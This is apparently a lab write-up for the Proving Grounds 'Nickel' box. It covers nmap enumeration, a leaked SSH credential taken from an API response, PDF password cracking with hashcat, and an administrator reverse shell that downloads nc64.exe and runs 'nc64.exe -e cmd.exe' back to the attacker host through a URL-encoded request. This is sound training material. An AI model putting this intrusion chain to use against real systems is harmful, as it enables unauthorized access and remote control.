#### Enumeration

Nmap

```bash
nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/home/kali/Documents/AutoRecon/results/192.168.69.99/scans/_full_tcp_nmap.txt" -oX "/home/kali/Documents/AutoRecon/results/192.168.69.99/scans/xml/_full_tcp_nmap.xml" 192.168.69.99
```

```
# Nmap 7.91 scan initiated Mon Nov  1 13:05:24 2021 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/AutoRecon/results/192.168.69.99/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/AutoRecon/results/192.168.69.99/scans/xml/_full_tcp_nmap.xml 192.168.69.99
Nmap scan report for 192.168.69.99
Host is up, received user-set (0.24s latency).
Scanned at 2021-11-01 13:05:26 EDT for 365s
Not shown: 65528 filtered ports
Reason: 65528 no-responses
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYR4Bx82VWETlsjIFs21j6lZ6/S40jMJvuXF+ay4Qz4b+ws2YobB5h0+IrHdr3epMNFmSY8JXFWzIILhkvF/rmadXRtGwib1VZkSa3nr5oYdMajoWK0jOVSoFJmDTJvhj+T3XE7+Q0tEkQ2EeGPrz7nK5XWzBp8SZdywCE/iz1HLvUIlsOqpDWHSjrnjkUaaleTgoVTEi63Dx4inY2KS5mX2mnS/mLzMlLZ0qj8vL9gz6ZJgf7LMNhXb/pWOtxfn6zmSoVHXEXgubXwLtrn4wOIvbZkm5/uEx+eFzx1AOEQ2LjaKItEqLlP3E5sdutVP6yymDTGBtlXgfvtfGS2lgZiitorAXjjND6Sqcppp5lQJk2XSBJC58U0SzjXdyflJwsus5mnKnX79nKxXPNPwM6Z3Ki1O9vE+KsJ1dZJuaTINVgLqrgwJ7BCkI2HyojfqzjHs4FlYVHnukjqunG90OMyAASSR0oEnUTPqFmrtL/loEc3h44GT+8m9JS1LgdExU=
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDJYE805huwKUl0fJM8+N9Mk7GUQeEEc5iA/yYqgxE7Bwgz4h5xufRONkR6bWxcxu8/AHslwkkDkjRKNdr4uFzY=
|   256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL8cLYuHBTVFfYPb/YzUIyT39bUzA/sPDFEC/xChZyZ4
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2021-11-01T17:10:11+00:00
| ssl-cert: Subject: commonName=nickel
| Issuer: commonName=nickel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-31T17:04:10
| Not valid after:  2022-05-02T17:04:10
| MD5:   aeff d7f6 5ee6 191a 3963 04dc fc46 1d4d
| SHA-1: 7cf2 8892 956f 2b65 ef4f ce84 a5ce 152b e877 3bff
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIQIXalaMoho7ZMBWolCrMl3TANBgkqhkiG9w0BAQsFADAR
| MQ8wDQYDVQQDEwZuaWNrZWwwHhcNMjExMDMxMTcwNDEwWhcNMjIwNTAyMTcwNDEw
| WjARMQ8wDQYDVQQDEwZuaWNrZWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQDly/vmp00kCX31dd9QTeRGu3ItdtQNYM4TJrK99vAuh5uDYWlr5f6VRUZb
| toKy2GCJLwTATLU7GOiOu/Q1asag3CitGi01gq23WEkOgrBW2+AyKi38R1+hYsFn
| 1wHH5HlUbTQN33yhDVXwPdxnqXh1oAiCBvOOZfBSiAgWTUBooA7YM9tJVmtkT+bi
| DYaG3ZF4RS3shMquqEg9490Tto4RN3USeuzLEDZXLAiQeapL3ZbPcNGZHEWPduZN
| 6yfEryzOh535Kg6Nkte/aapnwit/HFJN/drCKxciizU+/ahUOXVvmuSppInMVftT
| bj01sS5csyHdOKetsc16+OsRg+6dAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF
| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEAFDKdJl+9KHnBPM5i
| IKJCWWCq5pDjD6In1S0ClqaYbngJEUtYysKYGJI4h5rsMAeVBTpE5ycLwGm2KCjH
| qTtH7ggnQLa2FJyGCOMA/nqGguxu7Jhb1TqVNee3MEBmuhLx0bfkgKJm3SFTTQES
| zfJ9Ov7z3hy++xTcHaQoyPZlGTEXvy81tjuZLKINPaP80CxXFAXCuxUFQ/XtFptq
| vcRuZDqt0Kpn75zB6UUCnm5zK5q+Xxwv+7NPKexhEshQTHau8/NekgvwPqZd5K5l
| ytCnGvqAthP5UabJonzL9BpzWV6FUg/lHj/1epcCmf2Scv6xEnlE2apHmMUEhuLZ
| ut7aPA==
|_-----END CERTIFICATE-----
|_ssl-date: 2021-11-01T17:11:24+00:00; -4s from scanner time.
8089/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-favicon: Unknown favicon MD5: 9D1EAD73E678FA2F51A70A933B0BF017
| http-methods: 
|_  Supported Methods: GET
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
33333/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-favicon: Unknown favicon MD5: 76C5844B4ABE20F72AA23CBE15B2494E
| http-methods: 
|_  Supported Methods: GET POST
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (88%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows XP SP3 (88%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=11/1%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=61801FC3%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=108%II=I%TS=U)
SEQ(SP=100%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=U)
OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M506NW8NNS%O6=M506NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M506NW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -4s, deviation: 0s, median: -5s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59092/tcp): CLEAN (Timeout)
|   Check 2 (port 6019/tcp): CLEAN (Timeout)
|   Check 3 (port 26564/udp): CLEAN (Timeout)
|   Check 4 (port 59102/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   259.79 ms 192.168.49.1
2   259.78 ms 192.168.69.99

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  1 13:11:31 2021 -- 1 IP address (1 host up) scanned in 368.25 seconds

```

Connect to website on port 8089. There are three hyperlinks that look like api route.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nickel/Nickel_2021.11.06_18h10m40s_001_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nickel/Nickel_2021.11.06_18h11m21s_002_.png)

Try to send requests to test apis and one of them gives us response message. 

```
curl -X POST http://192.168.114.99:33333/list-running-procs -d ""
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nickel/Nickel_2021.11.06_19h09m27s_003_.png)

 In the response message has a content about execution of ssh. We can try to use this credential to log in to server via SSH.
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nickel/Nickel_2021.11.06_19h24m55s_004_.png)
 
 Decode the base64 string.
 
 ```
 echo "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" | base64 --decode
 ```
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nickel/Nickel_2021.11.06_19h37m38s_005_.png)
 
 Use the credential to log in.
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nickel/Nickel_2021.11.06_19h51m43s_006_.png)
 
 #### Privilege Escalation
 
 I find the ftp folder at the root of C drive. There has a file ```Infrastructure.pdf``` in the folder. We have to download it to our pc. 
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nickel/Nickel_2021.11.06_21h47m46s_007_.png)

I try different way to download the file but fail, because the firewall setting, many ports are not open.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nickel/Nickel_2021.11.06_21h50m26s_008_.png)

After searching I find that we can download the file using SSH.

```
scp ariah@192.168.114.99:/ftp/Infrastructure.pdf /tmp/Infrastructure.pdf
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nickel/Nickel_2021.11.06_21h58m58s_009_.png)

The pdf is protected by password. We can try to break it. First dump the password hash code by using [pdf2john.py](https://github.com/truongkma/ctf-tools/blob/master/John/run/pdf2john.py).

```
python3 pdf2john.py /tmp/Infrastructure.pdf > hash
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nickel/Nickel_2021.11.06_22h06m40s_010_.png)

Modify the hash file to correct the code.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nickel/Nickel_2021.11.06_22h10m32s_011_.png)

Now, we use hashcat to recover the password ```ariah4168```.

```
hashcat -m 10500 hash -a 0 /usr/share/wordlists/rockyou.txt --force
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nickel/Nickel_2021.11.06_22h15m50s_012_.png)

The document shows three links. The fisrt link may be able to execute command. 

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nickel/Nickel_2021.11.06_22h28m46s_013_.png)

After testing, I find that the link must be executed on the server side and service application be run as administrator.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nickel/Nickel_2021.11.06_22h52m10s_014_.png)

So we can execute a reverse shell command through this service. Get the ```nc64.exe``` program from our pc. You can find ```nc64.exe``` on the internet.

(avoid blocked port)

```
curl.exe -o nc64.exe http://192.168.49.114/nc64.exe
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nickel/Nickel_2021.11.06_23h06m09s_015_.png)

Because we have to pass the command through HTTP serivce, we have to encode our command. (Note the location of the ```nc64.exe```)

```
curl-X GET http://nickel/?/Users/ariah/Documents/nc64.exe -e cmd.exe 192.168.49.114 80
```

URL Encode

```
curl -X GET http://nickel/?%2FUsers%2Fariah%2FDocuments%2Fnc64.exe%20-e%20cmd.exe%20192.168.49.114%2080
```

We get the shell with administrator.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Nickel/Nickel_2021.11.06_23h23m25s_016_.png)
